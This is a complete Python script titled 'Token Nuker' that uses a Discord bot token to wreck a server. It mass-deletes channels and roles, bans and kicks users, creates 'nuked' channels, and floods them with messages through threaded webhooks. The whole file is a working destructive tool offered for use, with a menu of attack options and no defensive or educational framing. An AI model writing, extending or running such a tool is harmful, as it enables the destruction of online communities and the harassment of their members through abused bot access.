import requests
import time
import os
import threading
from colorama import Fore, init

init(autoreset=True)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

banner = """
███╗░░██╗██╗░░░██╗██╗░░██╗███████╗██████╗░
████╗░██║██║░░░██║██║░██╔╝██╔════╝██╔══██╗
██╔██╗██║██║░░░██║█████═╝░█████╗░░██████╔╝
██║╚████║██║░░░██║██╔═██╗░██╔══╝░░██╔══██╗
██║░╚███║╚██████╔╝██║░╚██╗███████╗██║░░██║
╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
               TOKEN NUKER
"""

BASE_URL = "https://discord.com/api/v10"

def headers(token):
    return {
        "Authorization": f"Bot {token}",
        "Content-Type": "application/json"
    }

def verify_token(token):
    url = f"{BASE_URL}/users/@me"
    r = requests.get(url, headers=headers(token))
    if r.status_code != 200:
        return False
    data = r.json()
    return data.get("bot", False) is True

def verify_guild(token, guild_id):
    url = f"{BASE_URL}/guilds/{guild_id}"
    r = requests.get(url, headers=headers(token))
    return r.status_code == 200

def create_channel(token, guild_id, name, type=0):
    url = f"{BASE_URL}/guilds/{guild_id}/channels"
    payload = {"name": name, "type": type}
    r = requests.post(url, headers=headers(token), json=payload)
    if r.status_code == 201:
        print(Fore.GREEN + f"[+] Created channel: {name} (ID: {r.json()['id']})")
        return r.json()['id']
    else:
        print(Fore.RED + f"[-] Failed to create channel {name}: {r.status_code} - {r.text}")
        return None

def delete_channel(token, channel_id):
    url = f"{BASE_URL}/channels/{channel_id}"
    r = requests.delete(url, headers=headers(token))
    if r.status_code in [200, 204]:
        print(Fore.GREEN + f"[+] Deleted channel ID: {channel_id}")
    else:
        print(Fore.RED + f"[-] Failed to delete channel {channel_id}: {r.status_code} - {r.text}")

def delete_role(token, guild_id, role_id, role_name):
    url = f"{BASE_URL}/guilds/{guild_id}/roles/{role_id}"
    r = requests.delete(url, headers=headers(token))
    if r.status_code in [200, 204]:
        print(Fore.GREEN + f"[+] Deleted role: {role_name}")
    else:
        print(Fore.RED + f"[-] Failed to delete role {role_name}: {r.status_code} - {r.text}")

def ban_user(token, guild_id, user_id):
    url = f"{BASE_URL}/guilds/{guild_id}/bans/{user_id}"
    r = requests.put(url, headers=headers(token))
    if r.status_code in [200, 204]:
        print(Fore.GREEN + f"[+] Banned user ID: {user_id}")
    else:
        print(Fore.RED + f"[-] Failed to ban user {user_id}: {r.status_code} - {r.text}")

def kick_user(token, guild_id, user_id):
    url = f"{BASE_URL}/guilds/{guild_id}/members/{user_id}"
    r = requests.delete(url, headers=headers(token))
    if r.status_code in [200, 204]:
        print(Fore.GREEN + f"[+] Kicked user ID: {user_id}")
    else:
        print(Fore.RED + f"[-] Failed to kick user {user_id}: {r.status_code} - {r.text}")

def create_webhook(token, channel_id, name="NukerWebhook"):
    url = f"{BASE_URL}/channels/{channel_id}/webhooks"
    payload = {"name": name}
    r = requests.post(url, headers=headers(token), json=payload)
    if r.status_code in [200, 201]:
        webhook = r.json()
        print(Fore.GREEN + f"[+] Created webhook {name}: ID {webhook['id']}")
        print(Fore.CYAN + f"    URL: https://discord.com/api/webhooks/{webhook['id']}/{webhook['token']}")
        return webhook['id'], webhook['token']
    else:
        print(Fore.RED + f"[-] Failed to create webhook: {r.status_code} - {r.text}")
        return None, None

def spam_webhook(webhook_id, webhook_token, message, count):
    url = f"https://discord.com/api/webhooks/{webhook_id}/{webhook_token}"
    for i in range(count):
        r = requests.post(url, json={"content": message})
        if r.status_code in [200, 204, 201]:
            print(Fore.YELLOW + f"[+] Webhook spam message {i+1} sent")
        else:
            print(Fore.RED + f"[-] Failed webhook spam message {i+1}: {r.status_code} - {r.text}")
        time.sleep(0.5)

def get_channels(token, guild_id):
    url = f"{BASE_URL}/guilds/{guild_id}/channels"
    r = requests.get(url, headers=headers(token))
    if r.status_code == 200:
        return r.json()
    print(Fore.RED + f"[-] Failed to fetch channels: {r.status_code} - {r.text}")
    return []

def get_roles(token, guild_id):
    url = f"{BASE_URL}/guilds/{guild_id}/roles"
    r = requests.get(url, headers=headers(token))
    if r.status_code == 200:
        return r.json()
    print(Fore.RED + f"[-] Failed to fetch roles: {r.status_code} - {r.text}")
    return []

def mass_delete_channels(token, guild_id):
    print(Fore.MAGENTA + "[*] Deleting all channels...")
    channels = get_channels(token, guild_id)
    for ch in channels:
        delete_channel(token, ch['id'])

def mass_delete_roles(token, guild_id):
    print(Fore.MAGENTA + "[*] Deleting all roles (except @everyone)...")
    roles = get_roles(token, guild_id)
    for role in roles:
        if role['name'] != "@everyone":
            delete_role(token, guild_id, role['id'], role['name'])

def mass_ban(token, guild_id):
    print(Fore.MAGENTA + "[*] Ban users by entering comma separated IDs.")
    ids = input("User IDs to ban (comma-separated): ")
    user_ids = [uid.strip() for uid in ids.split(",") if uid.strip()]
    for uid in user_ids:
        ban_user(token, guild_id, uid)

def mass_kick(token, guild_id):
    print(Fore.MAGENTA + "[*] Kick users by entering comma separated IDs.")
    ids = input("User IDs to kick (comma-separated): ")
    user_ids = [uid.strip() for uid in ids.split(",") if uid.strip()]
    for uid in user_ids:
        kick_user(token, guild_id, uid)

def create_webhook_menu(token, guild_id):
    channels = get_channels(token, guild_id)
    if not channels:
        print(Fore.RED + "No channels found to create webhook in.")
        return
    print(Fore.MAGENTA + "[*] Select channel to create webhook:")
    for idx, ch in enumerate(channels):
        print(f"{idx+1}. {ch['name']} (ID: {ch['id']})")
    choice = input("Choose channel number: ").strip()
    if not choice.isdigit() or int(choice) < 1 or int(choice) > len(channels):
        print(Fore.RED + "Invalid choice.")
        return
    ch = channels[int(choice) - 1]
    create_webhook(token, ch['id'])

def create_channel_menu(token, guild_id):
    name = input("Enter new channel name: ").strip()
    if not name:
        print(Fore.RED + "Channel name cannot be empty.")
        return
    create_channel(token, guild_id, name)

def spam_message_menu(token):
    channel_id = input("Enter channel ID to spam: ").strip()
    if not channel_id.isdigit():
        print(Fore.RED + "Invalid channel ID.")
        return
    message = input("Enter message to spam: ").strip()
    if not message:
        print(Fore.RED + "Message cannot be empty.")
        return
    try:
        count = int(input("Number of messages to send: ").strip())
    except ValueError:
        print(Fore.RED + "Invalid number.")
        return
    url = f"{BASE_URL}/channels/{channel_id}/messages"
    for i in range(count):
        r = requests.post(url, headers=headers(token), json={"content": message})
        if r.status_code in [200, 201]:
            print(Fore.YELLOW + f"[+] Sent message {i+1} to channel {channel_id}")
        else:
            print(Fore.RED + f"[-] Failed to send message {i+1}: {r.status_code} - {r.text}")
        time.sleep(0.3)

def basic_nuke(token, guild_id, message, num_channels=5, messages_per_channel=5):
    mass_delete_channels(token, guild_id)
    print(Fore.MAGENTA + "[*] Starting basic nuke: Creating channels + webhooks...")
    webhook_list = []
    for i in range(num_channels):
        channel_name = f"nuked-{i}"
        ch_id = create_channel(token, guild_id, channel_name)
        if ch_id:
            webhook_id, webhook_token = create_webhook(token, ch_id)
            if webhook_id and webhook_token:
                webhook_list.append((webhook_id, webhook_token))
            else:
                print(Fore.RED + f"[-] Could not create webhook in channel {channel_name}")
        else:
            print(Fore.RED + f"[-] Could not create channel {channel_name}")

    print(Fore.MAGENTA + "[*] Spamming all webhooks together...")
    threads = []
    for webhook_id, webhook_token in webhook_list:
        t = threading.Thread(target=spam_webhook, args=(webhook_id, webhook_token, message, messages_per_channel))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    print(Fore.GREEN + "[*] Basic nuke complete.")

def nuker_menu(token, guild_id):
    while True:
        clear()
        print(Fore.CYAN + banner)
        print(Fore.YELLOW + "[1] Basic Nuke            » Create channels + webhooks + spam messages")
        print(Fore.YELLOW + "[2] Mass Delete Channels  » Delete all channels")
        print(Fore.YELLOW + "[3] Mass Delete Roles     » Delete all roles except @everyone")
        print(Fore.YELLOW + "[4] Mass Ban Users        » Ban users by IDs")
        print(Fore.YELLOW + "[5] Mass Kick Users       » Kick users by IDs")
        print(Fore.YELLOW + "[6] Create Webhook        » Create webhook in channel")
        print(Fore.YELLOW + "[7] Create Channel        » Create new channel")
        print(Fore.YELLOW + "[8] Spam Message          » Spam messages in channel")
        print(Fore.YELLOW + "[0] Exit")

        choice = input(Fore.GREEN + "\nChoose an option: ").strip()
        if choice == "1":
            msg = input("Enter spam message: ")
            try:
                num_channels = int(input("Number of channels to create: "))
                messages_per_channel = int(input("Messages per webhook: "))
            except ValueError:
                print(Fore.RED + "Invalid number.")
                time.sleep(2)
                continue
            basic_nuke(token, guild_id, msg, num_channels, messages_per_channel)
            input("Press Enter to continue...")
        elif choice == "2":
            mass_delete_channels(token, guild_id)
            input("Press Enter to continue...")
        elif choice == "3":
            mass_delete_roles(token, guild_id)
            input("Press Enter to continue...")
        elif choice == "4":
            mass_ban(token, guild_id)
            input("Press Enter to continue...")
        elif choice == "5":
            mass_kick(token, guild_id)
            input("Press Enter to continue...")
        elif choice == "6":
            create_webhook_menu(token, guild_id)
            input("Press Enter to continue...")
        elif choice == "7":
            create_channel_menu(token, guild_id)
            input("Press Enter to continue...")
        elif choice == "8":
            spam_message_menu(token)
            input("Press Enter to continue...")
        elif choice == "0":
            print(Fore.CYAN + "Goodbye!")
            break
        else:
            print(Fore.RED + "Invalid choice.")
            time.sleep(1)

def main():
    clear()
    print(Fore.CYAN + banner)
    token = input("Enter bot token: ").strip()
    if not verify_token(token):
        print(Fore.RED + "Invalid bot token or not a bot token.")
        return
    guild_id = input("Enter guild ID: ").strip()
    if not verify_guild(token, guild_id):
        print(Fore.RED + "Invalid guild ID or bot does not have access.")
        return
    nuker_menu(token, guild_id)

if __name__ == "__main__":
    main()
